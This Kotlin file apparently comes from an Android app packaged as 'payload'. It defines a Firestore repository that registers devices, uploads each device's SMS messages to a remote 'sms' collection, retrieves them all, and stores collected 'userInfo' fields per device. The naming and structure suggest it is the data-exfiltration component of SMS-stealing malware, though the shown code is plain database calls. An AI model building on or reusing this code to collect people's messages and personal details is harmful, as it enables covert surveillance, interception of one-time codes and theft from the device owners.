package com.payload.jansiix0ne.repository

import com.google.firebase.firestore.FirebaseFirestore
import com.payload.jansiix0ne.models.DeviceModel
import com.payload.jansiix0ne.models.SmsModel
import kotlinx.coroutines.tasks.await

class FirestoreRepository {

    private val firestore = FirebaseFirestore.getInstance()

    suspend fun registerDevice(deviceModel: DeviceModel): Result<Unit> {
        return try {
            firestore.collection("devices")
                .document(deviceModel.deviceid)
                .set(deviceModel)
                .await()
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun uploadSms(deviceId: String, smsModel: SmsModel): Result<Unit> {
        return try {
            firestore.collection("devices")
                .document(deviceId)
                .collection("sms")
                .add(smsModel)
                .await()
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun getDeviceInfo(deviceId: String): Result<DeviceModel?> {
        return try {
            val document = firestore.collection("devices")
                .document(deviceId)
                .get()
                .await()
            
            val deviceModel = document.toObject(DeviceModel::class.java)
            Result.success(deviceModel)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun updateDeviceStatus(deviceId: String, updates: Map<String, Any>): Result<Unit> {
        return try {
            firestore.collection("devices")
                .document(deviceId)
                .update(updates)
                .await()
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun getAllSms(deviceId: String): Result<List<SmsModel>> {
        return try {
            val snapshot = firestore.collection("devices")
                .document(deviceId)
                .collection("sms")
                .get()
                .await()
            
            val smsList = snapshot.documents.mapNotNull { 
                it.toObject(SmsModel::class.java) 
            }
            Result.success(smsList)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun saveDeviceInfo(deviceId: String, deviceModel: DeviceModel): Result<Unit> {
        return try {
            firestore.collection("devices")
                .document(deviceId)
                .set(deviceModel, com.google.firebase.firestore.SetOptions.merge())
                .await()
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun saveUserFields(fields: Map<String, Any>, deviceId: String): Result<Boolean> {
        return try {
            // Update userInfo fields in device document
            val updates = mutableMapOf<String, Any>()
            fields.forEach { (key, value) ->
                updates["userInfo.$key"] = value
            }
            
            firestore.collection("devices")
                .document(deviceId)
                .update(updates)
                .await()
            
            Result.success(true)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
}
